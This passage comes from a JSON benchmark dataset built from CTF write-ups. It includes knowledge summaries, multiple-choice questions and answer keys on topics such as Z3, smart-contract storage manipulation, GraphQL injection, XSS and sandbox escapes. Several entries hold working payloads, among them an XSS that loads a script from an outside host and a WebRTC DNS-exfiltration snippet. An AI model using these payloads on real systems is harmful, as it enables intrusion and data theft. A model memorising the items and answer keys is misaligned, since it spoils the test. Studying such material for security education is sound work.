            "For challenges that require finding specific inputs satisfying complex mathematical or logical conditions, the Z3 Theorem Prover can be utilized to model and solve these conditions. By representing each unknown as a BitVec or an integer and adding constraints based on the challenge's requirements, Z3 can effectively find values that satisfy all given conditions. This method is particularly useful in reverse engineering challenges where the input conditions are non-trivial, involving arithmetic, bitwise operations, or specific character restrictions. A Z3 script typically involves creating a `Solver`, defining variables, adding constraints based on the challenge's logic, and asking the solver to find a model that satisfies all constraints. If a model is found, the solution can be extracted and decoded to retrieve the flag."
        ],
        "question": [
            "When utilizing angr for symbolic execution in a challenge, a common strategy is to create functions that recognize successful and failed execution states based on program output. In the provided script, two functions are defined to handle this recognition. Which line in the script sets up the condition for a state to be identified as successful? - A. `state.solver.add(flag.get_byte(0) == ord('n'))` - B. `stdout_output = state.posix.dumps(sys.stdout.fileno())` - C. `return b'You got it!' in stdout_output` - D. `sm.explore(find=is_successful, avoid=should_abort)` ",
            "In a given challenge that involved Z3 for solving logical and arithmetic constraints, the flag was encoded with complex conditions. Part of the script used BitVec variables to represent each character of the flag and added various constraints for solution. Which of these lines correctly adds a constraint ensuring the first character of the flag is an 'n' using Z3 syntax? - A. `flag = claripy.BVS(\"flag\", 8 * 30)` - B. `s.add(a[26] + a[24] + a[15] + a[13] + a[4] + a[2] + a[0] + a[28] == 486)` - C. `for i in range(35): s.add(Or(a[i] == ord('-'), And(a[i] >= ord('A'), a[i] <= ord('Z')), And(a[i] >= ord('a'), a[i] <= ord('z')), And(a[i] >= ord('0'), a[i] <= ord('9'))))` - D. `a = [BitVec(f'a{i}', 64) for i in range(35)]` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "[Blockchain] Re-Remix",
        "write_up": "dataset/raw/[Blockchain] Re-Remix.md",
        "type": "web",
        "competition": [
            "SekaiCTF/2022",
            "https://ctftime.org/event/1923/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "In Ethereum smart contracts, particularly in scenarios involving updating contract storage directly via assembly code, it's possible to exploit the contract by directly manipulating storage slots if the location and structure of storage variables are known. This technique can be used to bypass normal function and modifier-based restrictions. This method requires calculating the correct storage slot to manipulate and can be applied universally in contracts where direct storage access isn't properly guarded against. \n   - Example payload: `sampleEditor.updateSettings(0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb + 4, type(uint256).max);`",
            "Liquidity pool manipulation in DeFi platforms, specifically using techniques like flash loans or optimized swaps, can be employed to artificially inflate or deflate token values or pool reserves temporarily. This principle is applicable in scenarios where the contract logic depends on external oracles or the manipulated value from the pool to make decisions, such as calculating rewards, minting new tokens, or in this case, achieving a higher game level. Understanding the underlying mechanics of AMM (Automated Market Makers) and their functions allows for strategic insertion and removal of liquidity to achieve desired outcomes.\n   - Example command sequence: \n     1. `equalizer.equalize{value: 0.11 ether}(0, 1, 0.11 ether);`\n     2. `equalizer.equalize{value: 0.11 ether}(0, 2, 0.11 ether);`\n     3. `uint256[3] memory amounts = [uint(0.1 ether), uint(0.1 ether), uint(0.1 ether)];`\n     4. `inst.approve(address(equalizer), amounts[1]);`\n     5. `vocal.approve(address(equalizer), amounts[2]);`\n     6. `uint256 lpAmount = equalizer.increaseVolume{value: 0.1 ether}(amounts);`\n     7. `equalizer.decreaseVolume(lpAmount);`"
        ],
        "question": [
            "In a scenario where a blockchain game allows the modification of game parameters through direct storage manipulation using Solidity's assembly code, how would an attacker correctly adjust the `tracks[\"Rhythmic\"][2].settings.flexOn` to true to maximize the `region_tempo` setting, given the provided storage slot calculation for a struct within a mapping? - A. Call `updateSettings()` with the exact value of `0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb` and `true` for `flexOn`. - B. Call `updateSettings()` with `0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb + 4` and `1` to mistakenly attempt to toggle `flexOn`. - C. Use `sampleEditor.updateSettings(0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb + 4, type(uint256).max);` to correctly manipulate the storage slot and enable `flexOn`. - D. Directly modify the solidity enum `Align` for `tracks[\"Rhythmic\"][2].settings.align` to indirectly trigger `flexOn` to true. ",
            "When attempting to manipulate the complexity calculation for a game level in a blockchain-based game, utilizing DeFi protocol mechanics like swaps or liquidity pool adjustments, which series of actions would directly contribute to achieving a higher complexity score based on unique digit count in the `equalizer.getGlobalInfo()` return value? - A. Deploying a new smart contract to modify the game's algorithm directly. - B. Sequentially executing `equalizer.equalize` with arbitrary ether values, without understanding the pool's token dynamics. - C. Strategically performing `equalizer.equalize` and `equalizer.increaseVolume` followed by `equalizer.decreaseVolume` with pre-calculated ether and token amounts to manipulate pool reserves. - D. Minting new tokens directly without interacting with the liquidity pool, expecting to alter the game's complexity score. "
        ],
        "answer": [
            "C. Use `sampleEditor.updateSettings(0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bb + 4, type(uint256).max);` to correctly manipulate the storage slot and enable `flexOn`.",
            "C. Strategically performing `equalizer.equalize` and `equalizer.increaseVolume` followed by `equalizer.decreaseVolume` with pre-calculated ether and token amounts to manipulate pool reserves."
        ]
    },
    {
        "name": "[insert creative algo chall name]",
        "write_up": "dataset/raw/[insert creative algo chall name].md",
        "type": "misc",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 449,
        "max_score": 500,
        "difficulty": 0.898,
        "knowledge": [
            "When faced with a challenge requiring the enumeration of unique combinations or partitions of a set where operations on subsets are involved (e.g., summing elements within subsets), leveraging a high-level programming library such as `more_itertools` can significantly simplify the process. Utilizing `set_partitions` function from the `more_itertools` library can aid in dividing a set into a specific number of subsets efficiently. This approach is valuable when handling combinatorial problems in pythonic CTF challenges.\n   \n   Example of leveraging `more_itertools` for partitioning and summing subsets:\n   ```python\n   import more_itertools\n   \n   x = 4  # Number of desired subsets\n   n = 12 # The upper range for generating a set of exponential values\n   \n   r = [2**i for i in range(n)] # Generating a set of values\n   \n   parts = more_itertools.set_partitions(r, k=x) # Partitioning the set into x subsets\n   \n   summed_subsets = [set(sum(i) for i in p) for p in parts] # Summing elements within each subset\n   \n   print(len(summed_subsets)) # Printing the number of unique summed combinations\n   ```",
            "For challenges that involve generating sets with values increasing exponentially, a comprehension list generating exponential values using a simple for loop or through list comprehension can effectively establish the dataset required for the challenge. This method is a straightforward way to prepare data for further combinatorial operations or analyses.\n\n   Example of generating an exponentially increasing set:\n   ```python\n   n = 12 # Setting the upper limit for the exponential increase\n   \n   r = [2**i for i in range(n)] # Generating the set with exponential values\n   ```"
        ],
        "question": [
            "When solving a problem that requires partitioning a set into a specific number of subsets and summing the elements within those subsets, which Python library and function is most appropriate to simplify this process according to the scenario described?  - A. Using the `collections` library with the `Counter` function. - B. Employing the `itertools` library with the `combinations` function. - C. Utilizing the `math` library with the `factorial` function. - D. Leveraging the `more_itertools` library with the `set_partitions` function. ",
            "In the context of a challenge where you need to generate a set with values increasing exponentially, such as preparing data for combinatorial analysis, how would you correctly generate this set in Python as demonstrated in the scenario?  - A. `r = [i**2 for i in range(n)]` - B. `r = [2**i for i in range(n)]` - C. `r = [math.exp(i) for i in range(n)]` - D. `r = [i*2 for i in range(n)]` "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "[web] wtftime",
        "write_up": "dataset/raw/[web] wtftime.md",
        "type": "pwn",
        "competition": [
            "Tasteless/2021",
            "https://ctftime.org/event/1326/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting GraphQL injections in scenarios where the input parameter such as \"id\" isn't properly sanitized, it is possible to manipulate the query to extract or alter data. By modifying the GraphQL query, an attacker can abuse the alias functionality to retrieve different fields than intended. For example, requesting the \"name\" field instead of the \"description\" can be achieved by crafting a query where aliases are used to swap the expected data fields. \n   - Example payload: `/?#wtf/2){id,challs{description:name}}a:wtf(id:2`",
            "In Cross-Site Scripting (XSS) attacks where direct script insertion might be sanitized, embedding the payload in less straightforward HTML tags, such as `<iframe>` with a `srcdoc` attribute containing the malicious script, can bypass sanitization checks. This approach leverages browsers executing JavaScript within the `srcdoc` attribute, thus achieving the XSS without directly injecting `<script>` tags into the vulnerable application.\n   - Example payload for injecting XSS via GraphQL mutation: `mutation createChall{ createChall(input: {wtf:2, name:\"<iframe srcdoc=\\\"<script src='https://bi.tk/zob/xss.js'></script>\\\"></iframe>\", description:\"xss\"}){id} }`"
        ],
        "question": [
            "In the context of a web application using GraphQL, where input parameters are not sanitized, how can an attacker leverage the alias functionality in GraphQL to manipulate the query for extracting data in an unintended way? - A. By using JOIN clauses to combine multiple tables and extract more data - B. By modifying the query to include an alias that swaps the data fields, such as requesting a \"name\" field instead of the \"description\" - C. By implementing aggregation functions like COUNT to reveal the number of entries in a database - D. By injecting SQL commands to directly access the database without going through the GraphQL interface ",
            "Given a scenario where direct script insertion in a web application might be prevented through sanitization, which of the following techniques can be used to bypass such checks and achieve a Cross-Site Scripting (XSS) attack? - A. Encapsulating the XSS payload within SQL queries to hide it from sanitization mechanisms - B. Utilizing the HTML `<script>` tag directly with obfuscation techniques to confuse the sanitization process - C. Embedding the malicious script within an `<iframe>` tag's `srcdoc` attribute, leveraging browser execution of JavaScript contained in the attribute - D. Delivering the XSS payload via email attachments that the victim manually downloads and executes "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "_q!!!!!!!",
        "write_up": "dataset/raw/_q!!!!!!!.md",
        "type": "pwn",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In CTF challenges that involve exploitation of memory corruption vulnerabilities, especially in custom or patched virtual machines or interpreters (like the vim9script virtual machine in the vim editor), one effective method to achieve arbitrary read and write capabilities is by utilizing unintended behavior caused by missing reference count increments (or other similar bugs). Specifically, when an object's reference count handling is compromised, attackers can manipulate object lifetimes to trigger use-after-free (UAF) conditions. These UAF conditions can be stabilized and exploited to overwrite function pointers or data structures, leading to arbitrary code execution or leaking sensitive information. Under such conditions, the exploitation process often involves creating controlled heap layouts through object allocations, leveraging objects like blobs that are suitable for arbitrary data storage and manipulation, and carefully crafting payloads to overwrite memory locations or manipulate heap metadata to achieve the exploit goals.\n\nExample payload step to trigger UAF:\n```vim\ndef Pwn()\n    var obj: CustomClass = CustomClass.new()\n    ManipulateRef(obj)  # Trigger the vulnerable reference handling\n    # Further exploitation steps follow...\nenddef\n```",
            "When exploiting binary applications or interpreters with restrictions such as restricted mode (disallowing shell commands) and write prevention to the filesystem, a strategic approach is to first focus on bypassing these restrictions before executing arbitrary commands to disclose secrets like flags. This often involves understanding the application's memory layout and altering specific bits or memory addresses responsible for enforcing these restrictions. For instance, if the target binary has a 'restricted' mode flag or similar security mechanisms stored in its memory, an attacker can aim to achieve arbitrary read/write capabilities to modify these mechanisms directly in memory. Techniques to do this typically include leaking addresses of known libraries or the executable itself to calculate offsets to critical memory structures and then using arbitrary write primitives to alter them.\n\nExample steps to alter the 'restricted' mode flag:\n```vim\n# Assuming arbitrary write capability is achieved\nSetBlobDataPtr(blob_replace, restricted_address)\nblob_o.b[0] = 0  # Nullifying the 'restricted' mode flag, or similar memory patching actions\n# Now the application restrictions can be bypassed\n```"
        ],
        "question": [
            "In an exploitation scenario involving the vim9script virtual machine, an attacker successfully triggers a use-after-free condition due to a missing reference count increment. Given this setup, which object type would be ideal for an attacker to use for achieving arbitrary read/write capabilities due to its storage characteristics and absence of automatic data manipulation behaviors like null termination? - A. Integer object with customized manipulation functions to handle bit operations. - B. String object, given its zero-termination characteristic, ideal for straightforward data representation. - C. Custom object class without automatic memory management features. - D. Blob object, perfect for raw data storage without automatic modifications like null termination.",
            "When focusing on bypassing restrictions like the `restricted` mode in a binary application by exploiting memory corruption vulnerabilities, what type of data would be crucial for an attacker to leak first in order to calculate the address of the `restricted` mode flag or similar security mechanisms for modification? - A. The source code of the application to understand its logical flow and identify potential vulnerabilities. - B. The address of known library functions or the binary itself to calculate offsets to critical data structures. - C. Environment variables that might indirectly reveal memory layout details or important offsets. - D. Configuration files or user input validation routines to identify weak points in input handling."
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "_[a-z()",
        "write_up": "dataset/raw/_[a-z().]_.md",
        "type": "reverse",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In challenges restricting input characters and evaluating code within sandboxed environments like Node.js's `vm` module, utilizing inherent JavaScript properties and methods that do not require explicitly forbidden characters can bypass input restrictions. Specifically, using properties like `length`, `constructor`, and methods like `concat`, and exploring JavaScript's type coercion abilities can creatively construct and manipulate strings and numbers to achieve required outcomes. JavaScript's flexibility with types (e.g., auto-conversion between strings and numbers, using booleans as numbers) can be particularly useful.\n   \n   Example payload snippet: `((typeof(x)).length).constructor(true)` to generate the number `1` from a boolean `true`, and then `((typeof(x)).length).constructor((typeof(x)).big.name.length)` to generate the number `3` from the length of the function name `.big`.",
            "In scenarios where code length is severely limited, optimization techniques like leveraging JavaScript's type coercion and implicit conversions, or using less verbose methods accessible within the given constraints, help fit the payload within the character limit. Evaluating alternate methods with shorter syntax or exploiting language quirks (e.g., the automatic stringification of numbers when concatenated with strings) can reduce the overall length of the payload.\n\n   Example optimization: Reducing the payload size by omitting unnecessary type conversions for each digit after the first, and instead directly concatenating values to strings. This approach helps in fitting complex logic under strict size constraints."
        ],
        "question": [
            "In a sandboxed JavaScript environment where input characters are restricted and only specific characters and methods are allowed, which of the following approaches can successfully generate the number `1` by exploiting JavaScript's type coercion and allowed properties/methods? - A. `((typeof(x)).length).constructor(true)` by turning a boolean into a number and then to a string. - B. `(typeof(x)).big.name.length)` by directly accessing the length of the non-existent property `big`. - C. `((typeof(x)).length).constructor((typeof(x)).length)` by using the `length` of `undefined` to create a string. - D. `String.fromCharCode(49)` to directly generate the character `1`. ",
            "When optimizing JavaScript code to fit within a character limit for a specific computation in a challenge, which method would be the most efficient way to concatenate numbers to form a new number under the given constraints? - A. Using the `concat` method to string numbers together, followed by converting the string back to a number. - B. Directly adding numbers to strings to utilize JavaScript's automatic type conversion, reducing the need for explicit conversions. - C. Using multiple `constructor` calls for each digit to ensure each is explicitly converted to a string before concatenation. - D. Employing complex regular expressions to replace numerals with strings, followed by string concatenation. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "\u14a3\u2351\u254e\u03df \u254e\u03df \u30ea\u14b7\u158b\u14a3",
        "write_up": "dataset/raw/\u14a3\u2351\u254e\u03df \u254e\u03df \u30ea\u14b7\u158b\u14a3.md",
        "type": "crypto",
        "competition": [
            "SpaceHeroes/2024",
            "https://ctftime.org/event/2254/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When decrypting AES encrypted messages, the necessary elements include the key, initialization vector (IV), and the ciphertext itself. For CBC mode, the first 16 bytes of the ciphertext can be used as the IV if it is not explicitly provided. A decryption script requires extracting these components correctly: the key from the encryption script, the IV as the first 16 bytes of the ciphertext, and the rest of the data as the ciphertext to be decrypted.\n   - Example decryption script snippet:\n     ```py\n     from Crypto.Cipher import AES\n     import binascii\n\n     key = b\"your_key_here\"\n\n     with open('your_encrypted_file.enc', 'rb') as file:  \n        hex_data = file.read()\n\n     cipher_text_bytes = binascii.unhexlify(hex_data)\n     iv = cipher_text_bytes[:16]  \n     cipher_text = cipher_text_bytes[16:]\n\n     cipher = AES.new(key, AES.MODE_CBC, iv)\n     plain_text = cipher.decrypt(cipher_text)\n\n     print(plain_text.decode('utf-8'))\n     ```",
            "In challenges involving encrypted messages, knowing the message's structure or a specific pattern at the beginning can significantly aid in confirming successful decryption. If all messages start with a known phrase (e.g., \"Mortimer_McMire:\"), this can be used as a validation tool to ensure that the decryption process has been conducted correctly without necessarily understanding the entire message content.\n   - Example practical use:\n     When decrypting, after obtaining the plaintext output, verify it begins with the known prefix to confirm successful decryption, which can be particularly helpful in scenarios with multiple possible keys or when uncertain of the AES mode specifics if not explicitly provided."
        ],
        "question": [
            "Given a scenario where you are tasked with decrypting a message encrypted using AES in CBC mode, which of the following components are essential for successful decryption? - A. A private key and the message digest - B. The public key, IV, and ciphertext - C. The encryption key, IV (initialization vector), and ciphertext - D. A hash of the encryption key and the ciphertext only",
            "In cryptography challenges, particularly when dealing with standardized message formats, why is it useful to know a specific pattern at the beginning of all messages? - A. It allows for the immediate detection of successful encryption rather than decryption. - B. It aids in the identification of the encryption algorithm used without analyzing the encryption script. - C. It serves as a validation tool to confirm successful decryption without understanding the entire message content. - D. It helps increase the complexity and security of the encryption process, making decryption by unauthorized parties more difficult."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "\u1d2cnother \u1d64seless \u1d2cpplication",
        "write_up": "dataset/raw/\u1d2cnother \u1d64seless \u1d2cpplication.md",
        "type": "web",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "When dealing with a sandboxed iframe with a restricted Content-Security-Policy (CSP) that prevents direct data exfiltration, consider leveraging `baseURI` property exploitation techniques. This is particularly effective in environments where the iframe's restrictions do not explicitly seal off this property. By exploiting `baseURI`, which includes the full URL (including the fragment), attackers can circumvent sandbox constraints to disclose sensitive information through crafted payloads. This approach is conditionally applicable in scenarios where the iframe source document inherits a parent's URL structure, potentially leaking tokens or other sensitive data embedded in the URL fragment.\n\n   Example payload: \n   ```html\n   <svg onload=\"console.log(baseURI)\">  \n   ```",
            "For scenarios where conventional data exfiltration methods are blocked by CSP rules, consider DNS exfiltration via WebRTC. This method works around CSP by abusing legitimate web protocols for covert data transmission. The exploitation leverages RTCPeerConnection to establish a WebRTC channel, then encodes and transmits sensitive information through DNS requests. This can be particularly effective in scenarios where direct web requests to attacker-controlled servers are prevented by CSP, but where the policy does not restrict WebRTC or DNS traffic.\n\n   Example payload:\n   ```js\n   (async()=>{\n     p=new RTCPeerConnection({iceServers:[{urls:'stun:LEAK.dnsbin'}]}); \n     p.createDataChannel('');\n     p.setLocalDescription(await p.createOffer())\n   })()\n   ```"
        ],
        "question": [
            "When embedding user content in a sandboxed iframe with a CSP that prohibits external resources except for script execution and style sources from a specific CDN, how can the `baseURI` property be utilized to bypass sandbox restrictions and leak sensitive information?  - A. Encode the `baseURI` into an image source and load it externally to send the URL via a GET request. - B. Use `baseURI` in an AJAX call to fetch the sensitive data from the parent frame. - C. Log `baseURI` to the console as part of an SVG element's onload event. - D. Directly access the `baseURI` from the parent document and post it to an external server. ",
            "In the presence of a restrictive CSP that blocks data exfiltration attempts through standard means, which method can be effectively used to exfiltrate sensitive data by leveraging web protocols not restricted by CSP?  - A. Injecting a form and submitting data to an external domain using the target attribute. - B. Utilizing WebRTC and DNS requests through RTCPeerConnection for DNS exfiltration as a workaround to CSP restrictions. - C. Embedding external scripts to dynamically load and execute malicious code for data exfiltration. - D. Creating an iframe and setting its source to an external data collection URL. "
        ],
        "answer": [
            "C",
            "B"
        ]
    }
]